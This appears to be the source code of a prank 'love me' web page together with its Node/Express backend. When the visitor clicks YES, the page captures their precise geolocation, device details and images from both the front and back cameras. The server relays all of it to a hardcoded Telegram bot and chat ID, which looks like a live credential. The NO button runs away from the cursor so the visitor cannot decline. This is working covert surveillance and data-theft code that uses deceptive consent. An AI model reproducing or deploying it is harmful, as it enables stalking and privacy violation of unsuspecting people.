// Get references to buttons
const yesButton = document.querySelector(".yes");
const noButton = document.querySelector(".no");

// Handle "YES" button click
async function handleYes() {
  try {
    // Request location from the user
    if (navigator.geolocation) {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Fetch country name using reverse geocoding
      const countryName = await fetchCountryName(latitude, longitude);

      // Get device information
      const deviceInfo = getDeviceInfo();

      // Capture screenshots from front and back cameras
      const [frontCameraImage, backCameraImage] = await captureCameraImages();

      // Format Google Maps URL
      const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

      // Prepare data to be sent to the backend
      const messageData = {
        location: mapsUrl,
        country: countryName,
        device: deviceInfo.deviceName,
        osVersion: deviceInfo.osVersion,
        frontCameraImage,
        backCameraImage,
      };

      // Send data to the backend (which will handle Telegram integration)
      const response = await fetch("/send-to-telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(messageData),
      });

      if (!response.ok) {
        const errorDetails = await response.text(); // Get detailed error message
        throw new Error(`Backend error: ${errorDetails}`);
      }

      console.log("Data sent successfully!");
      document.getElementById("message").textContent =
        "Data sent successfully!";
      window.location.href = "loveme.html";
    } else {
      alert("Geolocation is not supported by your browser.");
    }
  } catch (error) {
    console.error("Error getting location or processing data:", error);
    document.getElementById("message").textContent =
      "Failed to send data. Please try again.";
  }
}

// Function to fetch country name using reverse geocoding
async function fetchCountryName(latitude, longitude) {
  const response = await fetch(
    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
  );
  const data = await response.json();
  return data.address.country || "Unknown Country";
}

// Function to get device information
function getDeviceInfo() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera;
  let deviceName = "Unknown Device";
  let osVersion = "Unknown OS";

  // Detect device name
  if (/android/i.test(userAgent)) {
    deviceName = "Android";
  } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
    deviceName = "iOS";
  }

  // Detect OS version
  if (navigator.userAgentData && navigator.userAgentData.platform) {
    osVersion = navigator.userAgentData.platform;
  } else if (navigator.platform) {
    osVersion = navigator.platform;
  }

  return { deviceName, osVersion };
}

// Function to capture screenshots from front and back cameras
async function captureCameraImages() {
  const constraintsFront = { video: { facingMode: "user" } };
  const constraintsBack = { video: { facingMode: "environment" } };
  let frontCameraImage = null;
  let backCameraImage = null;

  try {
    // Access front camera
    const frontStream = await navigator.mediaDevices.getUserMedia(constraintsFront);
    const frontVideo = document.createElement("video");
    frontVideo.srcObject = frontStream;
    await frontVideo.play();
    frontCameraImage = await captureVideoFrame(frontVideo);
    frontStream.getTracks().forEach((track) => track.stop());

    // Access back camera
    const backStream = await navigator.mediaDevices.getUserMedia(constraintsBack);
    const backVideo = document.createElement("video");
    backVideo.srcObject = backStream;
    await backVideo.play();
    backCameraImage = await captureVideoFrame(backVideo);
    backStream.getTracks().forEach((track) => track.stop());
  } catch (error) {
    console.error("Error accessing camera:", error);
  }

  return [frontCameraImage, backCameraImage];
}

// Function to capture a frame from a video element
function captureVideoFrame(video) {
  return new Promise((resolve) => {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    resolve(canvas.toDataURL("image/jpeg"));
  });
}

// Get reference to the "NO" button
const noButtonRef = document.querySelector(".no");

// Function to generate random coordinates within the viewport
function getRandomPosition() {
  const windowWidth = window.innerWidth;
  const windowHeight = window.innerHeight;
  const randomX = Math.random() * (windowWidth - noButtonRef.offsetWidth);
  const randomY = Math.random() * (windowHeight - noButtonRef.offsetHeight);
  return { x: randomX, y: randomY };
}

// Add event listener to move the button on hover
noButtonRef.addEventListener("mouseenter", () => {
  const { x, y } = getRandomPosition();
  noButtonRef.style.position = "absolute";
  noButtonRef.style.left = `${x}px`;
  noButtonRef.style.top = `${y}px`;
});
const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = " 7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your actual ptoken
const CHAT_ID = "1208908312"; // Replace with your actual chat ID

// Endpoint to handle data sent from frontend
app.post("/send-to-telegram", async (req, res) => {
  const { location, country, device, osVersion, frontCameraImage, backCameraImage } = req.body;

  // Construct the message text
  const messageText = `
    User Information:
    Location: ${location}
    Country: ${country}
    Device: ${device}
    OS Version: ${osVersion}
  `;

  try {
    // Send the text message to Telegram
    await sendMessageToTelegram(messageText);

    // Send the captured images to Telegram
    if (frontCameraImage) {
      await sendImageToTelegram(frontCameraImage, "Front Camera Screenshot");
    }
    if (backCameraImage) {
      await sendImageToTelegram(backCameraImage, "Back Camera Screenshot");
    }

    res.status(200).send("Data sent successfully to Telegram.");
  } catch (error) {
    console.error("Error sending data to Telegram:", error);
    res.status(500).send("Failed to send data to Telegram.");
  }
});

// Function to send a text message to Telegram
async function sendMessageToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Telegram API error: ${errorData.description}`);
  }
}

// Function to send an image to Telegram
async function sendImageToTelegram(imageData, caption) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("caption", caption);
  formData.append("photo", Buffer.from(imageData.split(",")[1], "base64"));

  const response = await fetch(
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
    {
      method: "POST",
      body: formData,
    }
  );

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(`Telegram API error: ${errorData.description}`);
  }
}

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});